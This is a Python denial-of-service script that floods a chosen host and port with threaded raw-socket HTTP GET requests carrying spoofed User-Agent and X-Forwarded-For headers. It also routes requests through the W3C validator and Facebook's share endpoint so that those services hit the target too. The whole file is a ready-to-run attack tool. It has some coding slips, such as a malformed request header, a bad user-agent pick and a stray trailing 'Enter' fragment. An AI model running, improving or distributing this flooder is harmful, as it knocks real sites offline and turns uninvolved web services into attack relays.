from queue import Queue
from fake_useragent import UserAgent
import urllib.request
import socket
import threading
import time
import random
import sys

if len(sys.argv) != 4:
    print(f"Usage: python {sys.argv[0]} example.com 80 100")
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
thr = int(sys.argv[3])

def user_agent_list():
    return [UserAgent().chrome for i in range(10)]

def bot_links():
    return [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u="
            ]

def bot_rippering(url, user_agent):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(user_agent)}))
            print("Bot is rippering...")
            time.sleep(.1)
    except:
        time.sleep(.1)

def down_it(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\r\nHost: " + host + "User-Agent: " + random.choice(user_agent) + "\r\nX-Forwarded-For: " + host + "\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n").encode('ascii')

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            if s.sendto(packet,(host,port)):
                s.shutdown(1)
                print(f"{time.ctime(time.time())} <-- packet sent rippering -->")
            else:
                s.shutdown(1)
                print("Shutdown")
            s.close()
    except socket.error as error:
        print(error)

def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def dos2():
    while True:
        item = w.get()
        bot_rippering(random.choice(bots) + f"http://{host}", random.choice(user_agent))
        w.task_done()

q = Queue()
w = Queue()

if __name__ == "__main__":
    user_agent = user_agent_list()
    bots = bot_links()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(3)
    except socket.error as error:
        print(error)
    while True:
        for i in range(thr):
            thread = threading.Thread(target=dos)
            thread.daemon = True
            thread.start()
            thread2 = threading.Thread(target=dos2)
            thread2.daemon = True
            thread2.start()
        start = time.time()
        item = 0
        while True:
            if item > 1800:
                item = 0
                time.sleep(.1)
            item += 1
            q.put(item)
            w.put(item)
            q.join()
            w.join()￼Enter
